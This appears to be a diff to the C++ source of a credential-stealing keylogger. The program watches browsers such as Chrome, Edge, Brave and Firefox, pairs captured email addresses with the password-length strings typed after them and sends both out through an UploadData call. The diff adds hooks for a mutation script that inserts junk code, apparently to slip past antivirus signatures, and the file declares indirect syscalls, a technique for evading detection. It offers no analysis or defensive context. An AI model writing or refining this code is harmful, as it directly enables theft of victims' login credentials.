@@ -27,6 +27,15 @@ extern "C" void DoIndirectSyscall();
 // --- CONFIGURATION ---
 std::vector<std::string> TARGET_APPS = { "chrome.exe", "msedge.exe", "brave.exe", "firefox.exe", "notepad.exe" };
 
+
+// --- JUNK CODE COMPATIBILITY ---
+// This ensures the mutate.py script works without errors
+void WriteLog(std::string text); 
+#define WriteDebug(x) WriteLog(x)
+
+
+
+
 // --- 1. JSON ESCAPING HELPER ---
 std::string EscapeJson(const std::string& s) {
     std::ostringstream o;
@@ -139,13 +148,15 @@ bool IsEmail(const std::string& s) {
 }
 
 void ProcessBuffer() {
+    // JUNK_HERE
+    
     if (buffer.empty()) return;
     if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }
 
     if (IsEmail(buffer)) {
         savedEmail = buffer;
         WriteLog("Saved Email: " + savedEmail);
-    } else if (buffer.length() >= 8) {
+    } else if (buffer.length() >= 8 && buffer.length() <= 64) {
         std::string finalEmail = savedEmail.empty() ? "N/A" : savedEmail;
         UploadData(finalEmail, buffer);
         savedEmail.clear();
